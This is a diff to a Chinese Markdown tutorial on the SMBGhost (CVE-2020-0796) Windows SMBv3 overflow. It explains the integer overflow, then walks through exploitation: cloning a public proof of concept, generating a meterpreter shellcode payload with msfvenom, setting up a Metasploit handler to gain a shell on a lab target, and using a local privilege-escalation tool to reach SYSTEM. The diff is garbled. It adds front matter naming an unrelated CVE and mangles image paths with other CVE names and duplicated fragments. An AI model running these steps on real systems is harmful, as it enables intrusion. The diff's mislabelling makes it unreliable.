@@ -1,3 +1,7 @@
+---
+cve: "CVE-2008-4250"
+---
+
 （CVE­-2020­-0796） Windows 远程溢出漏洞
 ----------------------------------------
 
@@ -107,7 +111,7 @@ SMB服务器驱动程序中的Srv2DecompressData函数中的整数溢出错误�
 
 该Srv2DecompressData函数接收客户端发送的压缩消息，分配所需的内存量，并解压缩数据。然后，如果Offset字段不为零，它会将放置在压缩数据之前的数据复制到分配的缓冲区的开头。
 
-![1.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId27.png)
+![1.png](./.resource/CVE-2008-4250【MS08-067】Windows远程溢出漏洞/media/rId27.png)Windows远程溢出漏洞/media/rId27.png)
 
 如果仔细观察，我们会发现第20行和第31行可能导致某些输入的整数溢出。例如，大多数在bug发布后不久出现并导致系统崩溃的poc都使用0xffffff值作为Offset字段。使用该值0xffffff会在第20行触发整
 数溢出，因此分配的字节更少。
@@ -116,7 +120,7 @@ SMB服务器驱动程序中的Srv2DecompressData函数中的整数溢出错误�
 
 是负数且无法表示，这也使得第30行的地址本身也无效。
 
-![2.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId28.png)
+![2.png](./.resource/CVE-2019-0708Windows远程溢出漏洞/media/rId28.png)Windows远程溢出漏洞/media/rId28.png)
 
 ### 3、选择溢出内容
 
@@ -131,7 +135,7 @@ SMB服务器驱动程序中的Srv2DecompressData函数中的整数溢出错误�
 
 不管是否要执行复制步骤，它看起来已经很有趣了------我们可以在解压缩阶段触发越界写入，因为我们设法分配了比"分配"阶段所需的字节少的字节。
 
-![3.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId30.png)
+![3.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId30.png)Windows远程溢出漏洞/media/rId30.png)
 
 如您所见，使用这种技术，我们可以触发任何大小和内容的溢出，这是一个很好的开始。但是什么位于我们的缓冲区之外？让我们找出答案！
 
@@ -203,7 +207,7 @@ Lookaside列表用于有效地为驱动程序保留一组可重用的、固定�
 
 SrvNetAllocateBufferFromPool函数使用ExAllocatePoolWithTag函数在NonPagedPoolNx池中分配一个缓冲区，然后用数据填充一些结构。分配的缓冲区的布局如下：
 
-![4.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId33.png)
+![4.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId33.png)Windows远程溢出漏洞/media/rId33.png)
 
 在我们的研究范围内，此布局的唯一相关部分是用户缓冲区和分配头结构。我们可以马上看到，通过溢出用户缓冲区，我们最终会重写ALLOCATION\_HEADER结构。看起来很方便。
 
@@ -309,37 +313,37 @@ kali下克隆下载利用poc
 
 `root\@kali2019:/opt\# git clone* https://github.com/ianxtianxt/SMBGhost_RCE_PoC.git`
 
-![5.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId38.jpg)
+![5.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId38.jpg)Windows远程溢出漏洞/media/rId38.jpg)
 
 切换到利用poc目录下
 
 `root\@kali2019:/opt\# cd SMBGhost_RCE_PoC/`
 
-![6.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId39.jpg)
+![6.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId39.jpg)Windows远程溢出漏洞/media/rId39.jpg)
 
 该POC需要用python3环境执行
 
-![7.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId40.png)
+![7.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId40.png)Windows远程溢出漏洞/media/rId40.png)
 
 可以看到目标靶机的IP地址以及系统版本
 
-![8.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId41.png)
+![8.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId41.png)Windows远程溢出漏洞/media/rId41.png)
 
-![9.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId42.png)
+![9.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId42.png)Windows远程溢出漏洞/media/rId42.png)
 
 在kali下生成python版本的反弹shellcode
 
 `root\@kali2019:\~\# msfvenom ``­``p windows/x64/meterpreter/bind_tcp lport=2333 ``­``f py ``­``o exp.py`
 
-![10.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId43.jpg)
+![10.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId43.jpg)Windows远程溢出漏洞/media/rId43.jpg)
 
-![11.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId44.png)
+![11.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId44.png)Windows远程溢出漏洞/media/rId44.png)
 
 可以看到生成的shellcode root\@kali2019:\~\# cat exp.py
 
 将生成的exp.py代码中的变量buf全部替换成变量USER\_PAYLOAD，然后将所有代码粘贴覆盖下面的代码处：
 
-![12.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId45.jpg)
+![12.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId45.jpg)Windows远程溢出漏洞/media/rId45.jpg)
 
 在kali上启动MSF，并如下设置`msf5 \> use exploit/multi/handler`
 
@@ -347,16 +351,16 @@ kali下克隆下载利用poc
 \#设置反弹模式msf5 exploit(multi/handler) \> set rhost 192.168.1.103\
 \#设置目标靶机IP地址
 
-![13.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId46.png)
+![13.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId46.png)Windows远程溢出漏洞/media/rId46.png)
 
 `msf5 exploit(multi/handler) \> set lport 2333 \#设置监听端口msf5`\
 `exploit(multi/handler) \> exploit`
 
 执行利用poc，可以看到成功执行，在按任意键，最好回车键即可`python3 exploit.py ``­``ip 192.168.1.103`
 
-![14.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId47.jpg)
+![14.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId47.jpg)Windows远程溢出漏洞/media/rId47.jpg)
 
-![15.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId48.jpg)
+![15.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId48.jpg)Windows远程溢出漏洞/media/rId48.jpg)
 
 在msf可以看到成功反弹出目标靶机的shell
 
@@ -372,19 +376,19 @@ ed2k://\|file\|cn\_windows\_10\_business\_editions\_version\_1909\_x64\_dvd\_0ca
 
     https://download.0-sec.org/系统安全/Windows/CVE-2020-0796提权poc.zip
 
-![16.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId50.png)
+![16.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId50.png)Windows远程溢出漏洞/media/rId50.png)
 
 这里我新建了一个普通权限的账号，可以看到权限很小
 
-![17.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId51.png)
+![17.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId51.png)Windows远程溢出漏洞/media/rId51.png)
 
 在普通账号上执行cve­2020­0796­local.exe，可以看到成功提权到system权限
 
-![18.jpg](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId52.jpg)
+![18.jpg](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId52.jpg)Windows远程溢出漏洞/media/rId52.jpg)
 
 ### 六、漏洞检测
 
-![19.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId54.png)
+![19.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId54.png)Windows远程溢出漏洞/media/rId54.png)
 奇 安 信 批 量 检 测 工 具 ：
 *http://dl.qianxin.com/skylar6/CVE­2020­0796­Scanner.zip*
 
@@ -392,7 +396,7 @@ sh 脚 本 检 测 ：
 [https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de9\
 37f5b6810df4441cc84f0fa63991e2e/check­smb­v3.11.sh](https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de937f5b6810df4441cc84f0fa63991e2e/check-smb-v3.11.sh)
 
-![20.png](./.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId56.png)
+![20.png](./.resource/CVE­-2020­-0796Windows远程溢出漏洞/media/rId56.png)Windows远程溢出漏洞/media/rId56.png)
 
     #!/bin/bash
     if [ $# -eq 0 ]
